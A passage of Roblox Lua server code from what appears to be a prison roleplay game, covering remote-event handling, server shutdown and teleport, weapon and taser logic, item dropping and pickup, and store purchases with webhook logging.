		end
	end)


	local Blacklist = require(game.ReplicatedStorage.Databases.Uniforms.AccessoryBlacklist)
	Player.CharacterAppearanceLoaded:Connect(function(character)	
		for i,v in pairs(character:GetChildren()) do 
			delay(0.25, function()
				for b,a in pairs(Blacklist) do
					if v.ClassName == "CharacterMesh" or v.Name == a then
						v:Destroy()
					end	
				end
			end)
		end
		if Player.Team == game.Teams.Incarcerated then
			FunctionService.WearUniform(Player, nil, "Inmate", "Inmate Clothes", nil, nil)
		else
			FunctionService.WearUni(Player)	
		end

		character:WaitForChild("Humanoid").Died:Connect(function()
			local Inventory = FunctionService.GetPlayerInventory(Player)
			local ItemType
			coroutine.wrap(function()
				for i,v in pairs(Inventory) do
					ItemType = v[2]
					if math.random(2) == 2 and not Items[ItemType].NoDeathDrop and not Items[ItemType].NoDrop and VerifyService.HaveItem(Player, ItemType) then
						PlayerService.dropTool(Player, ItemType)	
					end
				end
			end)()
			local tag = character:WaitForChild("Humanoid"):FindFirstChild("creator")
			local tool = character:WaitForChild("Humanoid"):FindFirstChild("tool")

			if tag then
				local killer = tag.Value
				local toolname = tool.Value

				if killer then
					local jsonToSend = {
						embeds = {
							{
								title = "Log Event",
								type = "rich",	
								description = killer.Name .. " has killed " .. Player.Name .. " ["..toolname.."]"
							}
						}
					}
					WebService.SendJSON("GodLog", jsonToSend)
				end
			end
			if game:GetService("ServerScriptService").Data:FindFirstChild(Player.UserId .. "_HandcuffData") then
				game:GetService("ServerScriptService").Data:FindFirstChild(Player.UserId .. "_HandcuffData"):Destroy()
			end
			if game:GetService("ServerScriptService").Data:FindFirstChild(Player.UserId .. "_CombatLoggingData") then
				game:GetService("ServerScriptService").Data:FindFirstChild(Player.UserId .. "_CombatLoggingData").Value = 0
			end
			if not game:GetService("ServerScriptService").Data:FindFirstChild(Player.UserId .. "_CombatLoggingData") then
				Remotes.RadioUpdate:FireClient(Player,false)
			end
		end)
	end)
end



function API.OnPlayerRemoved(Player)
	local DataTable = require(game.ServerScriptService.Services.VerifyService):GetData(Player)

	if require(game.ServerScriptService.Services.VerifyService):GetData(Player).Combat == false then
		require(game.ServerScriptService.Services.VerifyService):GetData(Player).Inventory = require(game.ServerScriptService.Services.FunctionService).GetPlayerInventory(Player)
	end
	PlayerDataStore:SetAsync(Player.UserId..Key, require(game.ServerScriptService.Services.VerifyService):GetData(Player))

	for i,v in pairs(game:GetService("ServerScriptService").Data:GetChildren()) do
		if v.Name == Player.UserId .. "_HandcuffData" then
			Remotes.LTAA:FireClient(v.Value, Player)
			v:Destroy()
		elseif v.Name == Player.UserId .. "_CombatLoggingData" then
			v:Destroy()
			Remotes.Notification:FireAllClients(Player.Name .. " has combat logged.", "Combat!", "Red")
			for i,v in pairs(game.Workspace.Vehicles:GetChildren()) do
				if v:FindFirstChild("Chassis") then
					if v.Chassis:FindFirstChild("DriverL") then
						if v.Chassis.DriverL.PlayerVal.Value == Player then
							local VehicleData = DataStore2(v.Name.."_VehicleData50", Player)

							VehicleData:Set({})
						end
					end
				end
			end
		end
	end

	if workspace.Interactions:FindFirstChild(tostring(Player.UserId)) then
		local Data = {{tostring(Player.UserId),nil}}
		Remotes.InteractUpdate:FireAllClients(Data)
		workspace.Interactions:FindFirstChild(tostring(Player.UserId)):Destroy()
	end

	for i,v in pairs(workspace.Ploppables:GetChildren())
	do
		if v:FindFirstChild("Creator") then
			if v.Creator.Value == Player then
				v:Destroy()
			end
		end
	end

	for i,v in pairs(game.Workspace.Vehicles:GetChildren()) do
		if v:FindFirstChild("Chassis") then
			if v.Chassis:FindFirstChild("DriverL") then
				if v.Chassis.DriverL.PlayerVal.Value == Player then
					v:Destroy()
				end
			end
		end
	end
end

function API.RegisterRemote(name, callback)
	if not Remotes:FindFirstChild(name) then
		return warn("No remote found in Remotes folder with specified remote name: " .. name)
	end
	if not callback then
		return warn("No callback specified for remote name: " .. name)
	end
	if Remotes[name]:IsA("RemoteEvent") then
		Remotes[name].OnServerEvent:Connect(function(Player)
			if Debug then
				print("[RemoteService] "..name.." "..Player.Name)
			end
		end)
		Remotes[name].OnServerEvent:Connect(callback)
	else
		Remotes[name].OnServerInvoke = function(Player)
			if Debug then
				print("[RemoteService] "..name.." "..Player.Name)
			end
		end
		Remotes[name].OnServerInvoke = callback	
	end
end

function API.DebugMode(State)
	Debug = State
end

API.RegisterRemote("BankUpdate", function(Player)
	API.UpdateMoney(Player)
end)


local NewKey = Instance.new("StringValue", script)
NewKey.Value = Key
NewKey.Name = "Key"

return API

      services.shutdownservice

      local ShutdownService = {}
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportGui = ReplicatedStorage.UI.TeleportGui
if (game.VIPServerId ~= "" and game.VIPServerOwnerId == 0) then
	game.ReplicatedStorage.Remotes.Notification:FireAllClients("This is a temporary lobby. Teleporting back in a moment.", "Server Shutdown!", "Red", true)
	local waitTime = 5

	Players.PlayerAdded:connect(function(player)
		for i,v in pairs(game.Players:GetPlayers()) do
			TeleportGui:Clone().Parent = v.PlayerGui
		end
		wait(waitTime)
		waitTime = waitTime / 2
		TeleportService:Teleport(game.PlaceId, player)
	end)

	for _,player in pairs(Players:GetPlayers()) do
		TeleportService:Teleport(game.PlaceId, player)
		wait(waitTime)
		waitTime = waitTime / 2
	end
else
	game:BindToClose(function()
		if (#Players:GetPlayers() == 0) then
			return
		end

		if (game:GetService("RunService"):IsStudio()) then
			return
		end
		game.ReplicatedStorage.Remotes.Notification:FireAllClients("The server is restarting for an update.", "Server Shutdown!", "Red", true)
		game.ReplicatedStorage.Remotes.Notification:FireAllClients("Combat logging has been disabled due to a server shut down occurring soon.", "Server Shutdown!", "Red", true)

		for i,v in pairs(Players:GetPlayers()) do
			if game.ServerScriptService.Data:FindFirstChild(v.Name .. "_CombatLoggingData") then
				game.ServerScriptService.Data:FindFirstChild(v.Name .. "_CombatLoggingData"):Destroy()	
			end
			require(game.ServerScriptService.Services.VerifyService):GetData(v).Combat = false
		end
		 
		game.ReplicatedStorage.Remotes.RadioUpdate:FireAllClients()
		local m = Instance.new("Message")
		m.Text = "Rebooting servers for update. Please wait"
		m.Parent = workspace
		wait(2)
		local reservedServerCode = TeleportService:ReserveServer(game.PlaceId)

		for _,player in pairs(Players:GetPlayers()) do
			TeleportService:TeleportToPrivateServer(game.PlaceId, reservedServerCode, { player })
		end
		Players.PlayerAdded:connect(function(player)
			TeleportService:TeleportToPrivateServer(game.PlaceId, reservedServerCode, { player })
		end)
		while (#Players:GetPlayers() > 0) do
			wait(1)
		end	
	end)
end

return ShutdownService

    services.toolservice
    local ToolService = {}
local ReplicatedStorage = game.ReplicatedStorage
local Items = require(ReplicatedStorage.Databases.Items)
local Databases = ReplicatedStorage.Databases
local Asset = require(Databases.Assets);
local Util = require(ReplicatedStorage.Shared.Util);
local Tools = game.ServerStorage.Tools
local ToolsData = require(ReplicatedStorage.Databases.Tools)
local Players = game.Players
local DataStore2 = require(script.Parent.Parent.MainModule)
local RolesData = require(ReplicatedStorage.Databases.Roles)
local VerifyService = require(game.ServerScriptService.Services.VerifyService)
local FunctionService = require(game.ServerScriptService.Services.FunctionService)
local PlayerService = require(game.ServerScriptService.Services.PlayerService)
local VehicleService = require(game.ServerScriptService.Services.VehicleService)
local Interactions = PlayerService.Interactions
local Util = require(ReplicatedStorage.Shared.Util)
local CollectionService = game:GetService("CollectionService")
local RANDOM, RAD, RAY, V3, CF, CFANG = math.random, math.rad, Ray.new, Vector3.new, CFrame.new, CFrame.Angles
local BC, INST, COLSEQ, FORMAT, INSERT = BrickColor.new, Instance.new, ColorSequence.new, string.format, table.insert
local WebService = require(game.ServerScriptService.Services.WebService)
local Remotes = ReplicatedStorage.Remotes
local Collection = game:GetService("CollectionService")
local RemoteService = require(game.ServerScriptService.Services.RemoteService)
function RegisterRemote(name, callback)
	RemoteService.RegisterRemote(name, callback)
end

function KarmaLog(Player, Tool)
	if VerifyService.CheckPermission(Player, "CanExemptKarma") == nil then
		local KarmaAmount = VerifyService:GetData(Player).Karma
		if VerifyService:GetData(Player).Karma > 0 then

			local Karma = Items[Tool].Karma
			VerifyService:GetData(Player).Karma = VerifyService:GetData(Player).Karma+30
			Remotes.Karma:FireClient(Player, VerifyService:GetData(Player).Karma)
		else
			if VerifyService:GetData(Player).Karma == 0 then
				game:GetService("ReplicatedStorage").Remotes.Notification:FireClient(Player, "Your actions have lead to a rise in bad karma. Continue and you may face consequences...", "Karma!", "Red");
			end
			local Karma = Items[Tool].Karma
			VerifyService:GetData(Player).Karma = VerifyService:GetData(Player).Karma+30
			Remotes.Karma:FireClient(Player, VerifyService:GetData(Player).Karma)
			repeat
				wait(30)
				VerifyService:GetData(Player).Karma = VerifyService:GetData(Player).Karma-10
				Remotes.Karma:FireClient(Player, VerifyService:GetData(Player).Karma)
			until VerifyService:GetData(Player).Karma == 0
		end
	end
end
Players.PlayerAdded:Connect(function(Plr)
	Plr.CharacterAppearanceLoaded:Connect(function(character)	
		character:WaitForChild("Humanoid").Died:Connect(function()
			if VerifyService:GetData(Plr).Karma then
				VerifyService:GetData(Plr).Karma = 0
				Remotes.Karma:FireClient(Plr, VerifyService:GetData(Plr).Karma)
			end
		end)
	end)
end)

local DelayInv = {}

RegisterRemote("GetInv", function(Player)
	if DelayInv[Player.Name] then
		return
	end
	DelayInv[Player.Name] = true

	ReplicatedStorage.Remotes.GetInv:FireClient(Player, {})
	print(VerifyService:GetData(Player).Inventory)
	delay(2, function()
		for i,v in pairs(VerifyService:GetData(Player).Inventory) do
			if v[2] ~= "FOID" then
				FunctionService.GiveItem(Player, v[2])
			end
		end
	end)
	VerifyService:GetData(Player).Inventory = {}
	DelayInv[Player.Name] = nil
end)


RegisterRemote("RadioUpdate", function(Player)
	FunctionService.Logging(Player)
end)

RegisterRemote("Flashlight", function(Player,Tool,Activated)
	if Tool:FindFirstChild("LightPart").FlashlightLight.Enabled == true then
		Tool.LightPart.FlashlightLight.Enabled = false
		Tool.LightPart.Transparency = 1
	else
		Tool.LightPart.FlashlightLight.Enabled = Activated
		Tool.LightPart.Transparency = Activated
	end
end)
RegisterRemote("Reload", function(Player, ToolId, AmmoId)
	local MagType
	local MagSize
	local Inventory = FunctionService.GetPlayerInventory(Player)
	local Config
	coroutine.wrap(function()
		for i,v in pairs(Inventory) do
			if v[1] == ToolId then
				Config = v
			end
		end

		for i,v in pairs(Inventory) do
			if v[1] == AmmoId then
				if ToolsData[Config[2]].Magazine == nil then
					v[3].R = v[3].R-1
					Remotes.UpdateInv:FireClient(Player, {{AmmoId, {R = v[3].R}, false}})
				end
				MagType = v[2]
				MagSize = v[3].R
			end
		end

		for i,v in pairs(Inventory) do
			if v[1] == ToolId then
				if ToolsData[v[2]].Magazine then
					if v[3].R then
						if v[3].R > 0 then
							FunctionService.GiveItem(Player, v[3].Mag, nil, nil, nil, {R = v[3].R})
						end
					end	
					v[3] = {Mag = MagType, R = MagSize}
					FunctionService.RemoveItem(Player, AmmoId)

				else
					if v[3].R < ToolsData[v[2]].MagSize then
						v[3].R = v[3].R+1
						Remotes.UpdateInv:FireClient(Player, {{v[1], {R = v[3].R}, false}})
					end
				end
			end
		end

		for i,v in pairs(Inventory) do
			if Items[v[2]].Type == "Magazine" then
				if v[3].R == 0 then
					FunctionService.RemoveItem(Player, v[1])
				end
			end
		end
	end)()
end)




RegisterRemote("ToolEffect", function(Player,Tool,sendTable)
	if Tool then
		for i, v in pairs(Players:GetPlayers()) do
			if v ~= Player and Tool:FindFirstChild("Class") then
				Remotes.ToolEffect:FireClient(v, Tool, Tool.Class.Value, sendTable)	
			end;
		end
	end;
end);



function RemovePlopInteraction(Name)
	Interactions[Name] = nil
	local Data = {{[1] = Name,[2] = {Data = nil}}}
	Remotes.InteractUpdate:FireAllClients(Data)
end

local Ploppables = require(game.ReplicatedStorage.Databases.Ploppables)

RegisterRemote("SetPlop", function(Player, Ploppable, Cframe)
	local PlopTable
	local PlopCount = 0
	for i,v in pairs(FunctionService.GetPlayerInventory(Player)) do
		if v[2] == Ploppable then
			PlopTable = v
		end
	end
	if not PlopTable then
		return
	end
	FunctionService.RemoveItem(Player, PlopTable[1])
	for i,v in pairs(game.Workspace.Ploppables:GetChildren()) do
		if v.Creator.Value == Player then
			PlopCount = PlopCount+1
		end
	end	
	if PlopCount > Ploppables[Ploppable].PlayerLimit then
		Remotes.Notification:FireClient(Player,"You have reached the limit of personal ploppables.","Ploppable Limit!","Red")
		return
	end
	spawn(function()
		local PloppableModel = game.ReplicatedStorage.Ploppables[Ploppable]:Clone()
		PloppableModel.Base.Transparency = 1
		PloppableModel.Parent = game.Workspace.Ploppables
		PloppableModel:SetPrimaryPartCFrame(Cframe)
		local Value = Instance.new("ObjectValue")
		Value.Parent = PloppableModel
		Value.Value = Player
		Value.Name = "Creator"
		local NewInteraction = game.ServerStorage.InteractionAddons.PlopInteract:Clone()
		NewInteraction.Parent = game.Workspace.Interactions
		NewInteraction.Config.Model.Value = PloppableModel
		NewInteraction.Config.PloppableType.Value = Ploppable
		NewInteraction.Name = tostring(#game.Workspace.Interactions:GetChildren())
		local Center, Size = PloppableModel:GetBoundingBox()
		NewInteraction.CFrame = Center
		Interactions[tostring(#game.Workspace.Interactions:GetChildren())] = {Data = {Pos = NewInteraction.Position,Type = "Ploppable",PloppableType = PloppableModel,Model = Ploppable},R = NewInteraction.Config.R.Value,Pos = NewInteraction.Position, Id = tostring(#game.Workspace.Interactions:GetChildren())}
		local Data = {{[1] = tostring(#game.Workspace.Interactions:GetChildren()),[2] = {Data = {Pos = NewInteraction.Position,Type = "Ploppable",PloppableType = Ploppable,Model = PloppableModel},R = NewInteraction.Config.R.Value,Pos = NewInteraction.Position, Id = tostring(#game.Workspace.Interactions:GetChildren())}}}
		Remotes.InteractUpdate:FireAllClients(Data)
	end)
end)


RegisterRemote("RemovePlop", function(Player,Id,Type,Plop)
	if not Plop or not Player or not Type or not Id then 
		return 
	end
	if not Ploppables[Type] or not Plop:IsDescendantOf(game.Workspace.Ploppables) then
		return
	end
	if not game:GetService("ReplicatedStorage").Ploppables:FindFirstChild(Type) then
		return
	end
	if not VerifyService.CheckPermission(Player, "CanGetItems", Type) then
		return
	end
	spawn(function()
		FunctionService.GiveItem(Player, Type)
		game.Workspace.Interactions:FindFirstChild(Id):Destroy()
		Plop:Destroy()
	end)
end)

RegisterRemote("CombatExec", function(player)
	FunctionService.Logging(player)
end)

local v12 = {}
RegisterRemote("ToolExec", function(player, tool, pos, hitTable)
	if not tool or not hitTable or not player then return end
	if Util.GetHumanoidFromPlayer(player).Health == 0 then
		return
	end
	local Inventory = FunctionService.GetPlayerInventory(player)
	coroutine.wrap(function()
		for i,v in pairs(Inventory) do
			if v[1] == tool.Name then
				if v[3] ~= nil then
					if v[3].R ~= nil then
						if v[3].R == 0 then
							return
						end
						v[3].R = v[3].R-1
						if ToolsData[v[2]].Magazine == nil then
							Remotes.UpdateInv:FireClient(player, {{v[1], {R = v[3].R}, false}})
						end

					end
				end
			end
		end
	end)()
	for _,v in pairs(hitTable) do
		if v[1] then
			if v[1] == nil then return end
			local originPos = (player.Character:FindFirstChild("Torso").CFrame * CFrame.new(0, 1.5, 0)).p
			local Humanoid = v[1].Parent and v[1].Parent:FindFirstChild("Humanoid") or v[1]
			local Character = Players:GetPlayerFromCharacter(Humanoid.Parent);
			local endPos = v[2] or v[1].Position
			local directionVec = (endPos - originPos).unit
			local IgnoreList = {player.Character, workspace.InvisibleParts}
			local ToolData = ToolsData[tool:FindFirstChild("Class").Value];
			if not VerifyService.HaveItem(player, tool.Name, true) or tool.Parent ~= player.Character then
				return;
			end;
			if #hitTable > 2 and ToolData.Asset ~= "Hawth500" then
				return;
			end;
			if (tool:FindFirstChild("Root").Position-v[1].Position).Magnitude >= ToolData.Range then
				return
			end
			local hit, position, sur, mat = FunctionService.Raycast(originPos, endPos, FunctionService.GetIgnoreList(player, player.Character), (originPos - endPos).magnitude);
			if hit and not hit:IsDescendantOf(Humanoid.Parent) then
				return
			end
			spawn(function()
				for _, NewPlayer in pairs(game.Players:GetPlayers()) do
					if NewPlayer.Character and NewPlayer ~= player then
						if (NewPlayer.Character:FindFirstChild("HumanoidRootPart").Position - tool:FindFirstChild("Root").Position).Magnitude <= 10 then
							FunctionService.Logging(NewPlayer)
						end
					end
				end
			end)
			if not ToolsData[tool:FindFirstChild("Class").Value].NoSmash then
				if game:GetService("CollectionService"):HasTag(v[1], "Glass") then
					if v[1].Transparency ~= 1 then
						coroutine.wrap(function()
							local GlassEffect = ReplicatedStorage.Effects.GlassSmash:Clone()
							GlassEffect.Parent = v[1]
							GlassEffect:Emit(120)
							Collection:AddTag(v[1], "Ignore") 
							Collection:RemoveTag(v[1], "Glass")
							local StartingTransparency = v[1].Transparency
							local StartingCollide = v[1].CanCollide
							local StartingParent = v[1].Parent
							v[1].Transparency = 1
							v[1].CanCollide = false
							local Sound = Instance.new("Sound")
							Sound.SoundId = "rbxassetid://170765215"
							Sound.Parent =	v[1]
							Sound:Play()
							v[1].Parent = game.Workspace.InvisibleParts
							delay(1.7, function()
								GlassEffect:Destroy()
								Sound:Destroy()
							end)
							delay(120, function()
								Collection:AddTag(v[1], "Glass") 
								Collection:RemoveTag(v[1], "Ignore")
								v[1].Transparency = StartingTransparency
								v[1].CanCollide = StartingCollide
								v[1].Parent = StartingParent
							end)
						end)()
					end
				end
			end
			if v[1].Parent:FindFirstChild("Humanoid") then
				if tool:FindFirstChild("Class").Value == "TI26" then
					if FunctionService.isSeated(Humanoid) then
						return
					elseif v[1].Parent:FindFirstChild("Humanoid") and not FunctionService.isSeated(Humanoid) then
						local Humanoid = v[1].Parent and v[1].Parent:FindFirstChild("Humanoid") or v[1]
						if v[1].Parent.Humanoid.PlatformStand == false then
							coroutine.wrap(function()
								local sound = Instance.new("Sound");
								sound.Name = player.Name .. "_Sound"
								Humanoid.PlatformStand = true;
								local Part = Instance.new("Part");
								Part.Name = player.Name .. "_TasePart"
								Part.CanCollide = false;
								Part.Size = Vector3.new(0.05, 0.05, 0.05);
								Part.Transparency = 1
								Part.Anchored = true
								Part.Parent = workspace.InvisibleParts;
								Part.CFrame = v[1].Parent.Torso.CFrame;
								local Att = Instance.new("Attachment");
								Att.Name = "TaserAttachment";
								Att.Position = Vector3.new(0, 0.5, -2);
								Att.Parent = player.Character:FindFirstChild("HumanoidRootPart");
								local rope = Instance.new("RopeConstraint")
								rope.Parent = game:GetService("ServerScriptService").Services.FunctionService
								rope.Thickness = 0.01
								rope.Visible = true
								rope.Color = BrickColor.new("Institutional white")
								local CMP = rope:Clone()
								CMP.Parent = Att
								CMP.Attachment0 = Att
								CMP.Attachment1 = Instance.new("Attachment", Part)
								CMP.Enabled = true
								CMP.Length = (Humanoid.Parent:FindFirstChild("HumanoidRootPart").Position - player.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude + 0.5
								sound.MaxDistance = 150
								sound.SoundId = Asset.TaserSound
								sound.Looped = true
								sound.Parent = Humanoid.Parent:FindFirstChild("HumanoidRootPart")
								sound:Play()
								if Character then
									Remotes.TaserEvent:FireClient(Character, true)
								end;

								if Part and Humanoid.PlatformStand == true then
									delay(5, function()
										sound:Destroy()
										Att:Destroy()
										Part:Destroy()
										Remotes.TaserEvent:FireClient(Character, false)
										Remotes.TaserEvent:FireClient(player, false)
										Humanoid.PlatformStand = false
									end)
								end

								RegisterRemote("TaserEvent", function(player)
									sound:Destroy()
									Remotes.TaserEvent:FireClient(Character, false)
									Remotes.TaserEvent:FireClient(player, false)
									Humanoid.PlatformStand = false
									if workspace.InvisibleParts:FindFirstChild(player.Name .. "_TasePart") then
										workspace.InvisibleParts[player.Name .. "_TasePart"]:Destroy()
									end
								end)
							end)()
						end
					end
				end
				if Humanoid:IsA("Humanoid") and not CollectionService:HasTag(v[1], "Glass") then
					if ToolData.Type == "Firearm" or ToolData.Type == "Melee" then
						if table.find({ "Right Arm", "Left Arm", "Torso", "Head", "Right Leg", "Left Leg" }, v[1].Name) then
							if Humanoid.Health > 0 then
								Humanoid:TakeDamage(ToolData.BaseDamage * ToolData.Multipliers[v[1].Name][math.random(2)]);
								FunctionService.tagHumanoid(Humanoid, player, tool:FindFirstChild("Class").Value)
								if Humanoid.Health <= 0 and not VerifyService.CheckPermission(Character, "CanExemptKarma")  then
									KarmaLog(player, ToolData.Asset)
								end
							end
							return true
						else
							if Humanoid.Health > 0 then
								Humanoid:TakeDamage(ToolData.BaseDamage * ToolData.Multipliers.Torso[math.random(2)]);
								FunctionService.tagHumanoid(Humanoid, player, tool:FindFirstChild("Class").Value)
								if Humanoid.Health <= 0 and not VerifyService.CheckPermission(Character, "CanExemptKarma") then
									KarmaLog(player, ToolData.Asset)
								end
							end
							return true
						end
					end
				end
			end
			local Vehicles = require(game.ReplicatedStorage.Databases.Vehicles)
			coroutine.wrap(function()
				for _, v2 in pairs(game.Workspace.Vehicles:GetChildren()) do
					if v[1]:IsDescendantOf(v2) then
						if v2.Chassis:FindFirstChild("DriverL") then
							v2.Chassis.DriverL.Health.Value = v2.Chassis.DriverL.Health.Value-ToolsData[tool.Class.Value].BaseDamage
							if v2.Chassis.DriverL.Health.Value <= 250 then
								v2.Chassis.RootPart.Engine.Smoke.Enabled = true
							end
							if v2.Chassis.DriverL.Health.Value <= 0 then
								local OwnedVehicles = DataStore2("OwnedVehicles12", player)
								local RealOwnedVehicles = OwnedVehicles:GetTable({})
								for i,v in pairs(RealOwnedVehicles) do
									if v == v2.Name then 
										table.remove(RealOwnedVehicles, i)
										OwnedVehicles:Set(RealOwnedVehicles)
									end
								end
								local vdatabase = require(game.ReplicatedStorage.Databases.Vehicles)
								if vdatabase[v2.Name].Paintable ~= nil then
									local PaintDataStore = DataStore2(v2.Name .. "_PaintData999", player)
									local VehicleColor = PaintDataStore:Get()
									if VehicleColor then
										PaintDataStore:Set()
									end
								end
								local VehicleData = DataStore2(v2.Name.."_VehicleData50", v2.Chassis.DriverL.PlayerVal.Value)
								local Data = VehicleData:GetTable({})
								VehicleData:Set({})	
								VehicleService.ExplodeVehicle(player, v2)
							end

						end		
					end
				end
			end)()

			for h,r in ipairs(game.Workspace.Vehicles:GetChildren()) do
				if v[1]:IsDescendantOf(r) and not CollectionService:HasTag(v[1], "Glass") then
					for _,v in pairs(game.Players:GetPlayers()) do
						if v ~= player then
							game.ReplicatedStorage.Remotes.OnToolFire:FireClient(v, hitTable)
						end
					end
					return true
				end
			end
		end
		for _,v in pairs(game.Players:GetPlayers()) do
			if v ~= player then
				game.ReplicatedStorage.Remotes.OnToolFire:FireClient(v, hitTable)
			end
		end
	end
end)


RegisterRemote("ItemRequest", function(Player,Id,Item)
	if not PlayerService.Distance(Player, Id) then
		return;
	end;
	if not VerifyService.CanStoreItem(Player, Item) then
		return
	end
	if VerifyService.HaveItem(Player, Item) and not Items[Item].MultiTake then
		return
	end
	if Interactions[Id].Data.Type == "ItemRequest" and Interactions[Id].Data.Item == Item then
		FunctionService.GiveItem(Player, Item)
		Remotes.Notification:FireClient(Player,Items[Item].Name.." was added to your inventory.","Item Added!")
		if Items[Item].Type ~= "Magazine" then
			local jsonToSend = {
				embeds = {
					{
						title = "Log Event",
						type = "rich",
						description = Player.Name .. " has dispensed a " .. Items[Item].Name
					}
				}
			}
			WebService.SendJSON("DspLog", jsonToSend)
		end	
	end

end)


local DroppedItems = {}

RegisterRemote("DropInv", function(Player,ItemId)
	if not Player or not ItemId then return end
	if DroppedItems[ItemId] then
		return
	end

	DroppedItems[ItemId] = true

	local Inventory = FunctionService.GetPlayerInventory(Player)
	local ItemType
	local SaveAmmo

	for i,v in pairs(Inventory) do
		if v[1] == ItemId then
			ItemType = v[2]

			if v[3].Mag then
				if v[3].R then
					if v[3].R > 0 then
						if ToolsData[v[2]].Magazine then
							FunctionService.GiveItem(Player, v[3].Mag, nil, nil, nil, {R = v[3].R})
						else
							SaveAmmo = v[3].R
						end
					end
				end
			end

			if Items[ItemType].Rounds then
				SaveAmmo = v[3].R
				print(v[3].R)
			end
			break
		end
	end

	for i,v in pairs(Inventory) do
		if v[3].Mag then
			if v[3].Mag == ItemId then
				v[3].Mag = nil
			end
		end
	end


	if not VerifyService.HaveItem(Player, ItemType)  then
		return
	end

	--print(SaveAmmo)


	local Pos = (Player.Character.Torso.CFrame * CF(math.random(-3,3), 0, math.random(-3,3))).p
	local hit, pos, sur = FunctionService.DropRaycast(Pos, FunctionService.IgnoreDropList(Player.Character))
	local RayClone = game.ServerStorage.Items[Items[ItemType].Asset]:Clone()
	local InteractPart = game.ServerStorage.InteractionAddons.DroppedItem:Clone()

	FunctionService.RemoveItem(Player,ItemId)
	if hit then
		local Name = ItemType..tostring(math.random(0,9999))
		RayClone.Parent = workspace.InvisibleParts
		local origCFrame = CFrame.new(pos)
		local lookVector = CF(0,0,0)
		RayClone:SetPrimaryPartCFrame(origCFrame * (lookVector - lookVector.p) * CFANG(0, math.random(0,360), 0))
		InteractPart.Config.C.Value = ItemType
		InteractPart.Config.K.Value = RayClone

		InteractPart.Name = Name
		InteractPart.Position = RayClone.Root.Position
		InteractPart.Parent = game.Workspace.Interactions
		CollectionService:AddTag(InteractPart, "InteractDynamic")
		local Class = Instance.new("StringValue")
		Class.Parent = RayClone
		Class.Value = ItemType
		Class.Name = "Class"
		if SaveAmmo ~= nil then
			local AmmoValue = Instance.new("NumberValue")
			AmmoValue.Parent = RayClone
			AmmoValue.Value = SaveAmmo
			AmmoValue.Name = "Ammo"
		end
		local PlayerVal = Instance.new("StringValue")
		PlayerVal.Parent = RayClone
		PlayerVal.Value = Player.Name
		PlayerVal.Name = "Player"
		Interactions[Name] = {Id = Name,Data = {Type = InteractPart.Config.Type.Value,C = InteractPart.Config.C.Value,K = InteractPart.Config.K.Value},R = InteractPart.Config.R.Value,Part = InteractPart}
		local Data = {{Name,{Id = Name,Data = {Type = InteractPart.Config.Type.Value,C = InteractPart.Config.C.Value,K = InteractPart.Config.K.Value},R = InteractPart.Config.R.Value,Part = InteractPart}}}
		Remotes.InteractUpdate:FireAllClients(Data)
		DroppedItems[ItemId] = nil
		local jsonToSend = {
			embeds = {
				{
					title = "Log Event",
					type = "rich",
					description = Player.Name .. " has dropped a " .. Items[ItemType].Name,
				}
			}
		}
		WebService.SendJSON("DrpLog", jsonToSend)
		delay(120, function()
			if RayClone.Parent ~= nil then
				Data = {{Name,{}}}
				Remotes.InteractUpdate:FireAllClients(Data)
				Interactions[Name] = nil
				InteractPart:Destroy()
				RayClone:Destroy()
			end
		end)
	else
		RayClone.Parent = nil
	end
end)

RegisterRemote("PickupInv", function(Player,Id,Model)
	if not Model.Parent == game.Workspace.InvisibleParts then
		return
	end
	if workspace.Interactions:FindFirstChild(Id) then
		if (workspace.Interactions[Id].Position - Player.Character:WaitForChild("HumanoidRootPart").Position).magnitude <= 10 then
			local Item = Model:FindFirstChild("Class").Value
			local plrfound = Model:FindFirstChild("Player").Value
			local Data = {{Id,{}}}
			if not VerifyService.CanStoreItem(Player, Item) then
				return
			end
			local Ammunition

			if Model:FindFirstChild("Ammo") then
				Ammunition = Model:FindFirstChild("Ammo").Value
			end
			Remotes.InteractUpdate:FireAllClients(Data)
			Interactions[Id] = nil
			game.Workspace.Interactions[Id]:Destroy()
			if Ammunition ~= nil then
				FunctionService.GiveItem(Player, Item, nil, nil, nil, {R = Ammunition})
				print(Ammunition)
			else
				FunctionService.GiveItem(Player,Item)
			end
			Model:Destroy()
			local jsonToSend = {
				embeds = {
					{
						title = "Log Event",
						type = "rich",
						description = Player.Name .. " has picked up a " .. Items[Item].Name.." from "..plrfound..""
					}
				}
			}
			WebService.SendJSON("DrpLog", jsonToSend)
		else
			print("No interaction found for Id:", Id)
			return
		end
	end
end)

RegisterRemote("ItemPurchase", function(player, id, store, item)
	if not PlayerService.Distance(player, id) then
		return;
	end
	if not VerifyService.CanStoreItem(player, item) or VerifyService.HaveItem(player, item) and not Items[item].MultiTake  then
		Remotes.Notification:FireClient(player, "You don't have the space to hold this item.", "Purchase Failure!", "Red");
		return
	end

	local Stores = require(game.ReplicatedStorage.Databases.Stores)
	if Stores[store] then
		local Bank = VerifyService:GetData(player).Bank
		local Cash = VerifyService:GetData(player).Cash
		for i,v in pairs(Stores[store].Items) do
			if v[1] == item then
				if Stores[store].Accepts == 3 then
					if Stores[store].Accepts == 3 then
						if Cash >= v[2] then
							VerifyService:GetData(player).Cash=Cash-v[2]
						elseif Bank >= v[2] then
							VerifyService:GetData(player).Bank=Bank-v[2]
						end
						Remotes.Notification:FireClient(player, "You now own a "..Items[item].Name.."!", "Purchase Successful!")
						FunctionService.GiveItem(player, item)
						local jsonToSend = {
							embeds = {
								{
									title = "Log Event",
									type = "rich",
									description = player.Name .. " has purchased a " .. Items[item].Name .. " from " .. Stores[store].Name .. ""
								}
							}
						}
						WebService.SendJSON("DrpLog", jsonToSend)
					else
						Remotes.Notification:FireClient(player, "You don't have the funds to purchase this item.", "Purchase Failure!", "Red")
					end
				elseif Stores[store].Accepts == 2 then
					if Cash >= v[2] then
						VerifyService:GetData(player).Cash=Cash-v[2]
						local jsonToSend = {
							embeds = {
								{
									title = "Log Event",
									type = "rich",
									description = player.Name .. " has purchased a " .. Items[item].Name .. " from " .. Stores[store].Name .. ""
								}
							}
						}
						WebService.SendJSON("DrpLog", jsonToSend)
						Remotes.Notification:FireClient(player, "You now own a "..Items[item].Name.."!", "Purchase Successful!")
						FunctionService.GiveItem(player, item)
						break
					else
						Remotes.Notification:FireClient(player, "You don't have the funds to purchase this item.", "Purchase Failure!", "Red")
					end	
				end
			end
		end
	else
		print(store.." does not exist")
		return
	end
	RemoteService.UpdateMoney(player)
end)



